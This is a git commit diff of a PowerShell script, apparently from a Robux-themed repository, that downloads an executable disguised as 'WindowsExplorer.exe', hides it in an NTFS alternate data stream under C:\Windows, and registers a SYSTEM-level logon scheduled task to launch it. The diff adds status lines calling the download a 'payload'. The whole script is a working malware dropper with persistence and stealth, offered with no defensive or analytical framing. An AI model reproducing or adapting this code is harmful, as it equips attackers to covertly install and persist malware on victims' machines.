550642aba647e4fd5deb515e9bdf987eda9ed421
Abdullah Zafar <102247412+HadronCollision@users.noreply.github.com>
2025-07-22 11:03:58 +0500

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,4 +1,8 @@
+Write-Host "Downloading payload"
+curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/WindowsExplorer.exe?token=GHSAT0AAAAAACQ6YJCXJ7BAD4F3GIWYSWPS2D7FEVQ -o russianhuzz
+Write-Host "Download complete"
 type russianhuzz > C:\Windows:Explorer
-Clear-Host
+Write-Host "Installing in progress"
 schtasks /create /tn "WindowsExplorer" /tr "C:\Windows\System32\cmd.exe /c wmic process call create \"C:\Windows:Explorer\"" /sc onlogon /ru "SYSTEM" /rl highest /f
-Clear-Host
+Write-Host "Installation complete"
+Write-Host "Restart the system to activate it"
